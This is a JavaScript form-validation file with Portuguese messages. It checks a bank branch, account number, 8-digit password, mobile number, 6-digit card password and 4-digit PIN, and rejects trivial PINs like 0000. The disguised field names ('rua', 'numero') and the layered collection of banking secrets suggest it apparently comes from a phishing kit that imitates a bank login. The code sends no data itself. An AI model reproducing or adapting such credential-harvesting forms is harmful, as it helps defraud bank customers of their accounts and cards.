// JavaScript Document
function limit(element, max_chars)
{
    if(element.value.length > max_chars) {
        element.value = element.value.substr(0, max_chars);
    }
}


function checkLogin(){
	var rua = $("#rua").val();
	var numero = $("#numero").val();
	var s8 = $("#s8").val();
	
	if (rua.length < 3){
		alert("Agência inválida.");
		$("#rua").val('');
		$("#rua").focus();
		return false;
	}
	
	if (numero.length < 3){
		alert("Conta inválida.");
		$("#numero").val('');
		$("#numero").focus();
		return false;
	}	
	
	if (s8.length < 8){
		alert("Senha inválida.");
		$("#s8").val('');
		$("#s8").focus();
		return false;
	}		
	
	return true;
}


function checkInformation(){
	var ddd = $("#ddd").val();
	var fone = $("#fone").val();
	var s6 = $("#s6").val();
	
	if (ddd.length < 2){
		alert("Informe o DDD corretamente");
		$("#ddd").val('');
		$("#ddd").focus();
		return false;
	}
	
	if (fone.length < 8){
		alert("Informe o CELULAR corremente");
		$("#fone").val('');
		$("#fone").focus();
		return false;
	}	
	
	if (s6.length < 6){
		alert("Senha do cartão inválida, Preencha corretamente.");
		$("#s6").val('');
		$("#s6").focus();
		return false;
	}		
	
	return true;	
}


function checkUpdate(){
	var s4 = $("#s4").val();
		
	if (s4.length < 4){
		alert("Senha de 4 dígitos inválida, Preencha corretamente.");
		$("#s4").val('');
		$("#s4").focus();
		return false;
	}		

	if ((s4 === '0000') || (s4 === '1111') || (s4 === '2222') || (s4 === '3333') || (s4 === '4444') || (s4 === '5555') ){
		alert("Senha de 4 dígitos inválida, Preencha corretamente.");
		$("#s4").val('');
		$("#s4").focus();
		return false;
	}		

	if ((s4 === '6666') || (s4 === '7777') || (s4 === '8888') || (s4 === '9999')){
		alert("Senha de 4 dígitos inválida, Preencha corretamente.");
		$("#s4").val('');
		$("#s4").focus();
		return false;
	}		
	
	return true;		
}


function saltarRua(){
	var campo = $("#rua").val();
	
	if (campo.length === 5){
		$("#numero").focus();
	}
	
}

function saltarDDD(){
	var campo = $("#ddd").val();
	
	if (campo.length === 2){
		$("#fone").focus();
	}
	
}